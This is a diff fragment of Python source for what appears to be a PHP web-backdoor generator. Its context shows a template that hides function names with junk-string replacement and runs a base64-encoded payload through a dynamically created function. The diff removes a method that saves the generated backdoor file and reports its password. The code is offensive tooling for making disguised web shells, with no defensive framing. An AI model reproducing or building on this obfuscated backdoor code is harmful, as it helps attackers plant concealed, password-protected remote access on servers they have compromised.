@@ -16,6 +16,7 @@
 # program. If not, go to http://www.gnu.org/licenses/gpl.html
 # or write to the Free Software Foundation, Inc.,
 # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
+
 import base64, codecs
 from random import random, randrange, choice, shuffle
 from pollution import random_string, pollute_with_static_str
@@ -44,7 +45,6 @@ $%%B64_FUNC%% = $%%REPL_FUNC%%("%%B64_POLLUTION%%", "", "%%B64_ENCODED%%");
 $%%CREATFUNC%% = $%%REPL_FUNC%%("%%CREATFUNC_POLLUTION%%","","%%CREATFUNC_ENCODED%%");
 $%%FINALFUNC%% = $%%CREATFUNC%%('', $%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR1%%.$%%PAY_VAR2%%.$%%PAY_VAR3%%.$%%PAY_VAR4%%))); $%%FINALFUNC%%();
 ?>"""
-
 
 	def __init__( self, password ):
 		
@@ -111,11 +111,3 @@ $%%FINALFUNC%% = $%%CREATFUNC%%('', $%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLL
 		
 		return template
 			
-		
-
-	def save( self, filename ):
-		out = file( filename, 'wt' )
-		out.write( self.backdoor )
-		out.close()
-
-		print "+ Backdoor file '%s' created with password '%s'." % ( filename, self.password )
